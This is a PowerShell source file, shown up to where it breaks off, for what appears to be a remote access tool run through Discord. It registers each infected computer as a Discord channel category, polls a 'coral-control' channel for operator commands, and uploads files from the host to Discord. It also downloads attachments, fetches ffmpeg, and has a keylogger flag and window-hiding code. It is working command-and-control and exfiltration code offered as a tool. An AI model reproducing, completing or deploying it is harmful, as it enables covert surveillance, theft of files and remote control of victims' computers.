#v1
# =============================== GLOBAL VARIABLES - IMPT ===============================
$global:token = $token
$script:Jobs = @{}
$global:hidewindow = $true
$global:keyloggerstatus = $false
$global:lastMessageAttachments = $null
$global:lastJobCheck = Get-Date
$global:processes = @()

# =============================== GLOBAL VAR - CHANNELS REGISTRY ==============================
$global:ChannelRegistry = @{}
$global:SessionID = $null  # Will be set to coral-control channel ID
# =============================== GLOBAL VAR - THEME (WIP) ==============================
# You can add more here but gotta install the files yourself ( URL not supported for now )
# shld add download and stuff
# change colors from hexi to deci
$global:themes = @{
    darktheme = @{
        color = 16767828
        image = $null
    }
    neko_maid = @{
        color = 16767828
        image = "./nekos/neko_maid.jpg"
    }
    neko_kimono = @{
        color = 16767828
        image = "./nekos/neko_kimono.jpg"
    }
    neko_cafe = @{
        color = 16767828
        image = "./nekos/neko_cafe.jpg"
    }

}
$global:currenttheme = "neko_maid"
$global:theme_enabled = $false

# =============================== THEME FUNCTIONS ======================
#GETTHEME
function GetCurrentTheme{
    if ($global:theme_enabled){
        sendEmbedWithImage -Title "CURRENT THEME" -Description "Theme: $($global:currenttheme)`nColor: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
    }
    else{
        sendEmbedWithImage -Title "THEMES DISABLED" -Description "Use the command `ENABLETHEME` to enable themes"
    }
}
#SETTHEME
function SetCurrentTheme{
    param([string]$themename)
    if ($global:themes.ContainsKey($themename)){
        $global:currenttheme = $themename
        sendEmbedWithImage -Title "THEME CHANGED" -Description "Theme changed to: $($global:currenttheme)`nColor: $($global:themes[$global:currenttheme].color)`nImage Path: $($global:themes[$global:currenttheme].image)"
    }
    else{
        $availableThemes = $global:themes.Keys -join ", "
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Theme not found**`nAvailable themes are: $availableThemes" -Color "13369344"
    }
}
#ENABLETHEME
function EnableTheme{
    $global:theme_enabled = $true
    sendEmbedWithImage -Title "THEMES ENABLED" -Description "Use the command `SETTHEME` to change the theme."
}
#DISABLETHEME
function DisableTheme{
    $global:theme_enabled = $false
    sendEmbedWithImage -Title "THEMES DISABLED" -Description "Use the command `ENABLETHEME` to enable themes."
}
# =============================== GET FFMPEGs ====================================

#ENABLEFFMPEG
function GetFfmpeg{
    sendEmbedWithImage -Title "DOWNLOADING FFMPEG" -Description "Please wait while FFmpeg is being downloaded..."  
    $Path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:temp"
    If (!(Test-Path $Path)){  
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient           
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
    sendEmbedWithImage -Title "FFMPEG DOWNLOAD COMPLETE" -Description "FFmpeg has been successfully downloaded and is ready to use."

}

#DISABLEFFMPEG
function RemoveFfmpeg{
    sendEmbedWithImage -Title "REMOVING FFMPEG" -Description "Please wait while FFmpeg is being removed..."
    $Path = "$env:Temp\ffmpeg.exe"
    If (Test-Path $Path){  
        rm -Path $Path -Force
        sendEmbedWithImage -Title "FFMPEG REMOVED" -Description "FFmpeg has been successfully removed."
    }
    
}

# =============================== DISCORD API FUNCTIONS ===============================
function Invoke-DiscordAPI {
    param(
        [string]$Url,
        [hashtable]$Headers,
        [string]$Method = "GET",
        [string]$Body = $null,
        [int]$RetryCount = 2,
        [int]$DelayMs = 500
    )
    $attempt = 0
    do {
        try {
            Start-Sleep -Milliseconds ($DelayMs * $attempt)
            $wc = New-Object System.Net.WebClient
            foreach ($key in $Headers.Keys) { $wc.Headers.Add($key, $Headers[$key]) }
            
            switch ($Method.ToUpper()) {
                "POST" {
                    if ($Body) {
                        $wc.Headers.Add("Content-Type", "application/json")
                        return $wc.UploadString($Url, "POST", $Body)
                    } else {
                        return $wc.UploadString($Url, "POST", "")
                    }
                }
                "DELETE" {
                    return $wc.UploadString($Url, "DELETE", "")
                }
                "GET" {
                    return $wc.DownloadString($Url)
                }
                default {
                    return $wc.DownloadString($Url)
                }
            }
        }
        catch {
            $attempt++
            if ($_.Exception.Message -match "429|Too Many Requests" -and $attempt -le $RetryCount) { continue }
            throw
        }
    } while ($attempt -le $RetryCount)
}

Function Get_BotUserId {
    $headers = @{ 'Authorization' = "Bot $global:token" }
    $botInfo = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me" -Headers $headers
    return ($botInfo | ConvertFrom-Json).id
}

Function CheckCategoryExists {
    $headers = @{ 'Authorization' = "Bot $global:token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guildID = ($response | ConvertFrom-Json)[0].id
    $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
    $channelList = $channels | ConvertFrom-Json
    
    foreach ($channel in $channelList) {
        if ($channel.type -eq 4 -and $channel.name -eq $env:COMPUTERNAME) {
            $global:CategoryID = $channel.id
            foreach ($subchannel in $channelList) {
                if ($subchannel.type -eq 0 -and $subchannel.name -eq "coral-control" -and $subchannel.parent_id -eq $channel.id) {
                    $global:ChannelID = $subchannel.id
                    return $true
                }
            }
        }
    }
    return $false
}

Function NewChannelCategory {
    $headers = @{ 'Authorization' = "Bot $token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guilds = $response | ConvertFrom-Json
    $guildID = $guilds[0].id
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{ "name" = "$env:COMPUTERNAME"; "type" = 4 } | ConvertTo-Json
    $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
    $responseObj = ConvertFrom-Json $response
    $global:CategoryID = $responseObj.id
}

Function NewChannel {
    param(
        [string]$name,
        [string]$assignTo = $null  # Optional: assign to specific variable or just register
    )
    
    if (-not $name) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Channel name required**" -Color "13369344"
        return $null
    }
    
    # Check if channel already exists in our registry
    if ($global:ChannelRegistry.ContainsKey($name)) {
        sendEmbedWithImage -Title "Channel Exists" -Description ":information_source: **Channel already exists:** ``$name`` (ID: $($global:ChannelRegistry[$name]))"
        return $global:ChannelRegistry[$name]
    }
    
    # Check if channel exists on Discord
    $headers = @{ 'Authorization' = "Bot $token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guilds = $response | ConvertFrom-Json
    $guildID = $guilds[0].id
    $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
    $channelList = $channels | ConvertFrom-Json
    
    # Look for existing channel with same name in our category
    foreach ($channel in $channelList) {
        if ($channel.type -eq 0 -and $channel.name -eq $name -and $channel.parent_id -eq $global:CategoryID) {
            # Channel exists, add to registry
            $global:ChannelRegistry[$name] = $channel.id
            sendEmbedWithImage -Title "Channel Found" -Description ":white_check_mark: **Found existing channel:** ``$name`` (ID: $($channel.id))"
            return $channel.id
        }
    }
    
    # Create new channel
    try {
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $body = @{ 
            "name" = "$name"
            "type" = 0
            "parent_id" = $global:CategoryID 
        } | ConvertTo-Json
        
        $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
        $responseObj = ConvertFrom-Json $response
        $channelId = $responseObj.id
        
        # Add to registry
        $global:ChannelRegistry[$name] = $channelId
        
        # Optionally assign to specific variable (for backwards compatibility)
        if ($assignTo -eq "main" -or $assignTo -eq "coral-control") {
            $global:ChannelID = $channelId
            $global:SessionID = $channelId
        }
        
        sendEmbedWithImage -Title "Channel Created" -Description ":white_check_mark: **Created channel:** ``$name`` (ID: $channelId)"
        return $channelId
        
    } catch {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Failed to create channel:** ``$name`` - $($_.Exception.Message)" -Color "13369344"
        return $null
    }
}



Function Get_OrCreateChannel {
    param([string]$channelName)
    
    if ($global:ChannelRegistry.ContainsKey($channelName)) {
        return $global:ChannelRegistry[$channelName]
    }
    
    return NewChannel -name $channelName
}

Function List_Channels {
    param(
        [switch]$ShowDetails,
        [switch]$ForceRefresh  # New parameter to force complete refresh
    )
    
    try {
        $headers = @{ 'Authorization' = "Bot $token" }
        $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
        $guilds = $response | ConvertFrom-Json
        $guildID = $guilds[0].id
        $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
        $channelList = $channels | ConvertFrom-Json
        
        # Track changes
        $oldCount = $global:ChannelRegistry.Count
        $newChannels = 0
        $updatedChannels = 0
        
        # Clear registry if forcing refresh
        if ($ForceRefresh) {
            $global:ChannelRegistry.Clear()
        }
        
        $foundChannels = @()
        
        # Find all text channels in our category
        foreach ($channel in $channelList) {
            if ($channel.type -eq 0 -and $channel.parent_id -eq $global:CategoryID) {
                
                # Check if this is a new channel or updated channel
                $wasExisting = $global:ChannelRegistry.ContainsKey($channel.name)
                $wasIdChanged = $wasExisting -and ($global:ChannelRegistry[$channel.name] -ne $channel.id)
                
                # Add/update in registry
                $global:ChannelRegistry[$channel.name] = $channel.id
                
                # Track changes
                if (-not $wasExisting) {
                    $newChannels++
                } elseif ($wasIdChanged) {
                    $updatedChannels++
                }
                
                $foundChannels += [PSCustomObject]@{
                    Name = $channel.name
                    Id = $channel.id
                    Position = $channel.position
                    Topic = $channel.topic
                    IsNew = -not $wasExisting
                    WasUpdated = $wasIdChanged
                    CreatedAt = if ($channel.id) { 
                        $timestamp = [math]::Floor(($channel.id -shr 22) + 1420070400000) / 1000
                        [DateTime]::new(1970,1,1,0,0,0,[DateTimeKind]::Utc).AddSeconds($timestamp).ToString("yyyy-MM-dd HH:mm:ss UTC")
                    } else { "Unknown" }
                }
            }
        }
        
        # Build response message
        $action = if ($ForceRefresh) { "Complete Refresh" } else { "Discovery & List" }
        $msg = ":file_folder: **Channel Registry - $action**`n`n"
        
        if ($ForceRefresh) {
            $msg += "**Previous count:** $oldCount`n"
            $msg += "**Current count:** $($global:ChannelRegistry.Count)`n"
            $msg += "**Registry completely rebuilt**`n"
        } else {
            $msg += "**Registry count:** $($global:ChannelRegistry.Count)`n"
            if ($newChannels -gt 0) {
                $msg += "**New channels discovered:** $newChannels`n"
            }
            if ($updatedChannels -gt 0) {
                $msg += "**Updated channels:** $updatedChannels`n"
            }
        }
        
        $msg += "**Category:** $env:COMPUTERNAME (ID: $global:CategoryID)`n`n"
        
        if ($foundChannels.Count -gt 0) {
            $msg += "**Channels:**`n"
            
            # Sort channels by position
            $sortedChannels = $foundChannels | Sort-Object Position
            
            foreach ($channel in $sortedChannels) {
                $isMain = if ($channel.Id -eq $global:SessionID) { " :star:" } else { "" }
                $status = ""
                if (-not $ForceRefresh) {
                    if ($channel.IsNew) { $status = " :new:" }
                    elseif ($channel.WasUpdated) { $status = " :repeat:" }
                }
                
                if ($ShowDetails) {
                    $msg += "**$($channel.Name)**$isMain$status`n"
                    $msg += "  ID: ``$($channel.Id)```n"
                    $msg += "  Position: $($channel.Position)`n"
                    $msg += "  Created: $($channel.CreatedAt)`n"
                    if ($channel.Topic) {
                        $topic = if ($channel.Topic.Length -gt 50) { $channel.Topic.Substring(0, 50) + "..." } else { $channel.Topic }
                        $msg += "  Topic: $topic`n"
                    } else {
                        $msg += "  Topic: None`n"
                    }
                    $msg += "`n"
                } else {
                    $msg += "**$($channel.Name)** - ``$($channel.Id)``$isMain$status`n"
                }
            }
        } else {
            $msg += ":warning: **No channels found in category**"
        }
        
        sendEmbedWithImage -Title "Channel Registry" -Description $msg
        
    } catch {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error accessing channel registry:** $($_.Exception.Message)" -Color "13369344"
    }
}

Function Remove_ChannelFromRegistry {
    param([string]$channelName, [switch]$DeleteFromDiscord = $true)
    
    if (-not $global:ChannelRegistry.ContainsKey($channelName)) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Channel not in registry:** ``$channelName``" -Color "13369344"
        return
    }
    
    $channelId = $global:ChannelRegistry[$channelName]
    
    # Check if this is the main channel - prevent deletion
    if ($channelId -eq $global:SessionID) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Cannot delete main channel:** ``$channelName``" -Color "13369344"
        return
    }
    
    if ($DeleteFromDiscord) {
        try {
            # Delete the channel from Discord
            $headers = @{ 'Authorization' = "Bot $token" }
            $deleteUrl = "https://discord.com/api/v10/channels/$channelId"
            
            $response = Invoke-DiscordAPI -Url $deleteUrl -Headers $headers -Method "DELETE"
            
            # Remove from local registry after successful deletion
            $global:ChannelRegistry.Remove($channelName)
            
            sendEmbedWithImage -Title "CHANNEL DELETED" -Description ":wastebasket: **Channel deleted successfully:** ``$channelName`` (ID: $channelId)"
            
        } catch {
            $errorMsg = $_.Exception.Message
            if ($errorMsg -match "403") {
                sendEmbedWithImage -Title "PERMISSION ERROR" -Description ":x: **Cannot delete channel:** ``$channelName`` - Bot lacks permission to delete channels" -Color "13369344"
            } elseif ($errorMsg -match "404") {
                # Channel doesn't exist on Discord, remove from registry anyway
                $global:ChannelRegistry.Remove($channelName)
                sendEmbedWithImage -Title "ERROR" -Description ":information_source: **Channel not found on Discord, removed from registry:** ``$channelName``" -Color "13369344"
            } else {
                sendEmbedWithImage -Title "ERROR" -Description ":x: **Error deleting channel:** ``$channelName`` - $errorMsg" -Color "13369344"
            }
        }
    } else {
        # Just remove from registry without deleting from Discord
        $global:ChannelRegistry.Remove($channelName)
        sendEmbedWithImage -Title "CHANNEL REMOVED FROM REGISTRY" -Description ":wastebasket: **Removed from registry only:** ``$channelName`` (ID: $channelId)"
    }
}
Function Set_MainChannel {
    param([string]$channelName)
    
    if ($global:ChannelRegistry.ContainsKey($channelName)) {
        $global:SessionID = $global:ChannelRegistry[$channelName]
        sendEmbedWithImage -Title "MAIN CHANNEL CHANGED" -Description ":star: **Main channel set to:** ``$channelName`` (ID: $($global:SessionID))"
    } else {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Channel not in registry:** ``$channelName``" -Color "13369344"
    }
}

Function PullMsg {
    $headers = @{ 'Authorization' = "Bot $token" }
    try {
        $messages = Invoke-DiscordAPI -Url "https://discord.com/api/v10/channels/$SessionID/messages" -Headers $headers
        $most_recent_message = ($messages | ConvertFrom-Json)[0]
        if ($most_recent_message.author.id -ne $botId) {
            $script:response = $most_recent_message.content
            $global:lastMessageAttachments = $most_recent_message.attachments
            return $most_recent_message.content
        }
    } catch {
        return $null
    }
}

# =============================== MESSAGE FUNCTIONS ===============================
function sendMsg {
    param(
        [string]$Message, 
        [hashtable]$Embed, 
        [string]$ImagePath,
        [string]$ChannelTarget = $null  # Can be channel name or ID
    )
    
    # Determine target channel
    $targetChannelId = $global:SessionID  # Default to main channel
    
    if ($ChannelTarget) {
        # Check if it's a channel name in registry
        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
        }
        # Check if it's a valid channel ID (20+ digit string)
        elseif ($ChannelTarget -match '^\d{18,20}$') {
            $targetChannelId = $ChannelTarget
        }
        # Try to create/find the channel
        else {
            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
            if (-not $targetChannelId) {
                $targetChannelId = $global:SessionID  # Fallback to main
            }
        }
    }
    
    $url = "https://discord.com/api/v10/channels/$targetChannelId/messages"
    
    # Rest of function remains the same, just use $targetChannelId
    if ($ImagePath -and (Test-Path $ImagePath)) {
        sendMsgWithImage -Message $Message -Embed $Embed -ImagePath $ImagePath -ChannelTarget $targetChannelId
        return
    }
    
    if ($Embed) {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
        $jsonBody = $Embed | ConvertTo-Json -Depth 10 -Compress
        try { $response = $wc.UploadString($url, "POST", $jsonBody) } catch {}
    }
    
    if ($Message) {
        if ($Message.Length -gt 15000) { Send_AsFile -Content $Message -ChannelTarget $targetChannelId }
        elseif ($Message.Length -gt 1950) { Send_ChunkedMessage -Content $Message -ChannelTarget $targetChannelId }
        else { Send_SingleMessage -Content $Message -ChannelTarget $targetChannelId }
    }
}

function sendMsgWithImage {
    param([string]$Message, [hashtable]$Embed, [string]$ImagePath, [string]$ChannelTarget = $null)
    
    if (-not (Test-Path $ImagePath)) {
        sendMsg -Message ":x: **Image file not found:** ``$ImagePath``" -ChannelTarget $ChannelTarget
        return
    }
    
    # Determine target channel
    $targetChannelId = $global:SessionID
    
    if ($ChannelTarget) {
        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
        } elseif ($ChannelTarget -match '^\d{18,20}$') {
            $targetChannelId = $ChannelTarget
        } else {
            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
            if (-not $targetChannelId) { $targetChannelId = $global:SessionID }
        }
    }
    
    $url = "https://discord.com/api/v10/channels/$targetChannelId/messages"
    
    try {
        # Create multipart form data
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        # Prepare the payload
        $payload = @{}
        
        if ($Message) {
            $payload.content = $Message
        }
        
        if ($Embed) {
            $payload.embeds = @($Embed)
        }
        
        $jsonPayload = $payload | ConvertTo-Json -Depth 10 -Compress
        
        # Read image file
        $imageBytes = [System.IO.File]::ReadAllBytes($ImagePath)
        $fileName = [System.IO.Path]::GetFileName($ImagePath)
        
        # Build multipart form data properly
        $bodyLines = @()
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"payload_json`""
        $bodyLines += "Content-Type: application/json"
        $bodyLines += ""
        $bodyLines += $jsonPayload
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$fileName`""
        $bodyLines += "Content-Type: application/octet-stream"
        $bodyLines += ""
        
        # Convert text to bytes
        $bodyText = ($bodyLines -join $LF) + $LF
        $bodyTextBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyText)
        
        # End boundary
        $endBoundary = $LF + "--$boundary--" + $LF
        $endBoundaryBytes = [System.Text.Encoding]::UTF8.GetBytes($endBoundary)
        
        # Combine all bytes
        $totalBytes = New-Object byte[] ($bodyTextBytes.Length + $imageBytes.Length + $endBoundaryBytes.Length)
        [Array]::Copy($bodyTextBytes, 0, $totalBytes, 0, $bodyTextBytes.Length)
        [Array]::Copy($imageBytes, 0, $totalBytes, $bodyTextBytes.Length, $imageBytes.Length)
        [Array]::Copy($endBoundaryBytes, 0, $totalBytes, $bodyTextBytes.Length + $imageBytes.Length, $endBoundaryBytes.Length)
        
        # Send request
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Authorization", "Bot $token")
        $webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
        $webClient.Headers.Add("User-Agent", "CoralAgent/1.0")
        
        $response = $webClient.UploadData($url, "POST", $totalBytes)
        $webClient.Dispose()
        
    } catch {
        # Fall back to regular file upload if embed with image fails
        try {
            if ($Message -or ($Embed -and $Embed.title)) {
                $fallbackMsg = if ($Message) { $Message } else { $Embed.title }
                sendMsg -Message $fallbackMsg -ChannelTarget $ChannelTarget
            }
            sendFile -sendfilePath $ImagePath -ChannelTarget $ChannelTarget
        } catch {
            sendMsg -Message ":x: **Error sending image:** $($_.Exception.Message)" -ChannelTarget $ChannelTarget
        }
    }
}

function sendEmbedWithImage {
    param(
        [string]$Title, 
        [string]$Description, 
        [string]$ImagePath = $null, 
        [int]$Color = -1,  # Changed from $null to -1 as default
        [string]$ChannelTarget = $null
    )
    
    # Use provided channel or fallback to session channel
    $targetChannelId = $global:SessionID
    
    if ($ChannelTarget) {
        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
        } elseif ($ChannelTarget -match '^\d{18,20}$') {
            $targetChannelId = $ChannelTarget
        } else {
            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
            if (-not $targetChannelId) { $targetChannelId = $global:SessionID }
        }
    }
    
    if ($Color -eq -1) {
        $Color = $global:themes[$global:currenttheme].color
    }
    
    # Determine image path logic
    $finalImagePath = $null
    
    if ([string]::IsNullOrEmpty($ImagePath)) {
        if ($global:theme_enabled -eq $true) {
            $themeImagePath = $global:themes[$global:currenttheme].image
            if ($themeImagePath -and (Test-Path $themeImagePath)) {
                $finalImagePath = $themeImagePath
            }
        }
    } else {
        if (Test-Path $ImagePath) {
            $finalImagePath = $ImagePath
        }
    }
    
    # Send embed with or without image based on final determination
    if ($finalImagePath) {
        $embed = @{
            title = $Title
            description = $Description
            color = $Color
            image = @{
                url = "attachment://$(Split-Path $finalImagePath -Leaf)"
            }
        }
        sendMsgWithImage -Embed $embed -ImagePath $finalImagePath -ChannelTarget $targetChannelId
    } else {
        $embed = @{
            embeds = @(
                @{
                    title = $Title
                    description = $Description
                    color = $Color
                }
            )
        }
        sendMsg -Embed $embed -ChannelTarget $targetChannelId
    }
}
function Send_SingleMessage {
    param([string]$Content, [string]$ChannelTarget = $null)
    
    # Determine target channel
    $targetChannelId = $global:SessionID
    
    if ($ChannelTarget) {
        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
        } elseif ($ChannelTarget -match '^\d{18,20}$') {
            $targetChannelId = $ChannelTarget
        } else {
            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
            if (-not $targetChannelId) { $targetChannelId = $global:SessionID }
        }
    }
    
    $url = "https://discord.com/api/v10/channels/$targetChannelId/messages"
    $headers = @{ 'Authorization' = "Bot $token" }
    $cleanMessage = Clean_MessageContent -InputMessage $Content
    
    if ($cleanMessage.Length -gt 1950) {
        $cleanMessage = $cleanMessage.Substring(0, 1950) + "... (truncated)"
    }
    
    $jsonBody = @{ "content" = $cleanMessage } | ConvertTo-Json -Compress
    
    try {
        $response = Invoke-DiscordAPI -Url $url -Headers $headers -Method "POST" -Body $jsonBody
    } catch {
        try {
            $fallbackMessage = $Content -replace '[^\w\s\.\-\(\)\[\]\{\},:;!@#$%^&*+=<>?/|\\`~]', '?'
            if ($fallbackMessage.Length -gt 1800) {
                $fallbackMessage = $fallbackMessage.Substring(0, 1800) + "... (sanitized)"
            }
            $fallbackJson = @{ "content" = $fallbackMessage } | ConvertTo-Json -Compress
            $response = Invoke-DiscordAPI -Url $url -Headers $headers -Method "POST" -Body $fallbackJson
        } catch {}
    }
}

function Send_ChunkedMessage {
    param([string]$Content, [string]$ChannelTarget = $null)
    
    $chunks = Split_IntoChunks -Text $Content -ChunkSize 1800
    $totalChunks = $chunks.Count
    
    if ($totalChunks -gt 8) { Send_AsFile -Content $Content -ChannelTarget $ChannelTarget; return }
    
    Send_SingleMessage -Content ":page_facing_up: **Large output detected - sending in $totalChunks parts:**" -ChannelTarget $ChannelTarget
    
    for ($i = 0; $i -lt $chunks.Count; $i++) {
        $partNumber = $i + 1
        $chunkContent = "**Part $partNumber/$totalChunks :**`n``````$($chunks[$i])``````"
        Send_SingleMessage -Content $chunkContent -ChannelTarget $ChannelTarget
        Start-Sleep -Milliseconds 750
    }
    Send_SingleMessage -Content ":white_check_mark: **Output complete ($totalChunks parts sent)**" -ChannelTarget $ChannelTarget
}

function Send_AsFile {
    param([string]$Content, [string]$ChannelTarget = $null)
    
    try {
        $tempDir = $env:TEMP
        $fileName = "coral_output_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $tempFile = Join-Path $tempDir $fileName
        $Content | Out-File -FilePath $tempFile -Encoding UTF8
        
        if (Test-Path $tempFile) {
            sendFile -sendfilePath $tempFile -ChannelTarget $ChannelTarget
            $fileSize = [math]::Round((Get-Item $tempFile).Length / 1KB, 2)
            Send_SingleMessage -Content ":page_facing_up: **Large output sent as file** (Size: $fileSize KB, Length: $($Content.Length) characters)" -ChannelTarget $ChannelTarget
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } else {
            Send_SingleMessage -Content ":warning: **Failed to create temp file - sending truncated output:**" -ChannelTarget $ChannelTarget
            $truncated = $Content.Substring(0, 1800) + "`n`n... (output too large, file creation failed)"
            Send_SingleMessage -Content "``````$truncated``````" -ChannelTarget $ChannelTarget
        }
    } catch { Send_ChunkedMessage -Content $Content -ChannelTarget $ChannelTarget }
}
function Split_IntoChunks {
    param([string]$Text, [int]$ChunkSize = 1800)
    $chunks = @()
    $currentPos = 0
    $textLength = $Text.Length
    
    while ($currentPos -lt $textLength) {
        $remainingLength = $textLength - $currentPos
        $actualChunkSize = [Math]::Min($ChunkSize, $remainingLength)
        $chunk = $Text.Substring($currentPos, $actualChunkSize)
        
        if ($currentPos + $actualChunkSize -lt $textLength) {
            $lastNewline = $chunk.LastIndexOf("`n")
            if ($lastNewline -gt ($actualChunkSize * 0.6)) {
                $chunk = $chunk.Substring(0, $lastNewline)
                $actualChunkSize = $lastNewline
            } elseif ($chunk.LastIndexOf(" ") -gt ($actualChunkSize * 0.8)) {
                $lastSpace = $chunk.LastIndexOf(" ")
                $chunk = $chunk.Substring(0, $lastSpace)
                $actualChunkSize = $lastSpace
            }
        }
        
        $chunks += $chunk
        $currentPos += $actualChunkSize
        
        if ($currentPos -lt $textLength -and ($Text[$currentPos] -eq "`n" -or $Text[$currentPos] -eq " ")) {
            $currentPos++
        }
    }
    return $chunks
}

function Clean_MessageContent {
    param([string]$InputMessage)
    if ([string]::IsNullOrEmpty($InputMessage)) { return "" }
    
    $cleaned = $InputMessage
    $cleaned = $cleaned -replace "â‚‚", "|" -replace "â€€", "-" -replace "âŒ", "+" -replace "â", "+" -replace "â""", "+" -replace "â˜", "+"
    $cleaned = $cleaned -replace "`0", "" -replace "[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]", ""
    $cleaned = $cleaned -replace "[^\u0009\u000A\u000D\u0020-\u007E]", "?"
    return $cleaned
}

# =============================== FILE FUNCTIONS (R)===============================

#SENDFILE
function sendFile {
    param([string]$sendfilePath, [string]$ChannelTarget = $null)
    
    # Determine target channel
    $targetChannelId = $global:SessionID
    
    if ($ChannelTarget) {
        if ($global:ChannelRegistry.ContainsKey($ChannelTarget)) {
            $targetChannelId = $global:ChannelRegistry[$ChannelTarget]
        } elseif ($ChannelTarget -match '^\d{18,20}$') {
            $targetChannelId = $ChannelTarget
        } else {
            $targetChannelId = Get_OrCreateChannel -channelName $ChannelTarget
            if (-not $targetChannelId) { $targetChannelId = $global:SessionID }
        }
    }
    
    if (-not $sendfilePath -or -not (Test-Path $sendfilePath -PathType Leaf)) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** ``$sendfilePath``" -Color "13369344" -ChannelTarget $targetChannelId 
        return
    }

    $fileInfo = Get-Item $sendfilePath
    $fileName = $fileInfo.Name
    $fileSize = $fileInfo.Length
    $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
    
    if ($fileSize -gt 10MB) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **File too large:** ``$fileName`` (${fileSizeMB}MB). Maximum allowed is 10MB."  -Color "13369344" -ChannelTarget $targetChannelId
        return
    }

    $url = "https://discord.com/api/v10/channels/$targetChannelId/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    if (Test-Path $sendfilePath -PathType Leaf) {
        $response = $webClient.UploadFile($url, "POST", $sendfilePath)
    } else {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **File not found:** ``$sendfilePath``"  -Color "13369344" -ChannelTarget $targetChannelId
    }
}
#DOWNLOADFILE
function downloadFile {
    param([string]$attachmentUrl, [string]$fileName, [string]$downloadPath = $env:TEMP)
    
    if (-not $attachmentUrl -or -not $fileName) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Error:** Missing attachment URL or filename"  -Color "13369344"
        return
    }
    
    try {
        $fullPath = Join-Path $downloadPath $fileName
        
        if (Test-Path $fullPath) {
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $nameWithoutExt = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
            $extension = [System.IO.Path]::GetExtension($fileName)
            $fileName = "${nameWithoutExt}_${timestamp}${extension}"
            $fullPath = Join-Path $downloadPath $fileName
        }
        
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($attachmentUrl, $fullPath)
        $webClient.Dispose()
        
        if (Test-Path $fullPath) {
            $fileSize = [math]::Round((Get-Item $fullPath).Length / 1KB, 2)
            sendEmbedWithImage -Title "File Download Complete" -Description "Path: ${fullPath}`nSize: ${fileSize} KB"
            return
        } else {
            sendEmbedWithImage -Title "ERROR" -Description ":x: **Download failed:** File was not created"  -Color "13369344"
        }
    } catch {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Download error:** $($_.Exception.Message)"  -Color "13369344"
    }
}

# =============================== WINDOW FUNCTIONS ===============================
function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
